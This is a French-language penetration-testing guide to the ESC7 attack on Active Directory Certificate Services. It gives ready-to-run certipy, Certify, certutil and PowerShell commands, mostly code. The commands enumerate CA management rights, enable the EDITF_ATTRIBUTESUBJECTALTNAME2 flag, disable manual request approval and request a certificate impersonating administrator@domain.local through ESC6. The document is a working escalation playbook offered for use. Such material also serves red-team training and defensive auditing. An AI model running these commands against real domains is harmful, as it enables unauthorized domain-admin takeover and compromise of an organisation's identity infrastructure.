### Description

ESC7 exploite des permissions excessives sur l'autorité de certification elle-même, permettant à un utilisateur de définir le flag `EDITF_ATTRIBUTESUBJECTALTNAME2` via l'interface de gestion à distance ou de désactiver l'approbation des certificats, créant ainsi artificiellement les conditions pour d'autres attaques (comme ESC6).

### Conditions vulnérables

Une CA est vulnérable à ESC7 si :

1. **Permissions de gestion sur la CA** - L'utilisateur a les droits `ManageCA` ou `ManageCertificates`
2. **Accès aux interfaces de gestion** - Possibilité d'utiliser `certutil`, MMC, ou les interfaces distantes
3. **Templates d'authentification disponibles** - Des modèles permettant l'authentification existent
4. **Pas de protection additionnelle** - Absence de monitoring ou de restrictions sur les modifications de configuration

---

### Exploitation depuis linux (certipy)

Enumération des permissions sur les CAs :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec focus sur les permissions CA
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output ca_permissions.json 

# Recherche spécifique des permissions ManageCA
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A10 -B5 "ManageCA\|ManageCertificates"
```

Activation du flag EDITF_ATTRIBUTESUBJECTALTNAME2 :

```bash
# Tentative de modification de la configuration CA via certipy
certipy ca -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -enable-user-specified-san

# Vérification que le flag est maintenant activé
certipy find -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA'
```

Exploitation post-modification (ESC6) :

```bash
# Maintenant que EDITF_ATTRIBUTESUBJECTALTNAME2 est activé, exploitation ESC6
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'User' -upn administrator@domain.local
```

Désactivation de l'approbation manuelle :

```bash
certipy ca -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -disable-request-approval
```

---

### Exploitation depuis windows (certutil + PowerShell)

Enumération des permissions sur les CAs :

```powershell
# Énumération des modèles et CAs vulnérables 
Certify.exe find /vulnerable 

# Recherche spécifique des permissions ManageCA
Certify.exe find /vulnerable | findstr "ManageCA\|ManageCertificates"

# Vérification manuelle des permissions
icacls "C:\Windows\System32\CertSrv" /T
```

Modification de la configuration CA :

```powershell
# Activation du flag EDITF_ATTRIBUTESUBJECTALTNAME2 (nécessite ManageCA)
certutil -setreg CA\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

# Vérification de l'activation
certutil -getreg CA\EditFlags

# Redémarrage du service CA pour appliquer les changements
Restart-Service CertSvc
```

Modification des politiques d'approbation :

```powershell
# Désactivation de l'approbation manuelle sur tous les modèles
certutil -setreg CA\RequestDisposition 1

# Ou modification spécifique via registre
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\*" -Name RequestDisposition -Value 1
```

Exploitation post-modification :

```powershell
# Exploitation ESC6 maintenant possible
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:User /altname:administrator@domain.local

# Ou modification de templates existants (si permissions suffisantes)
certutil -SetCATemplates +VulnerableTemplate
```

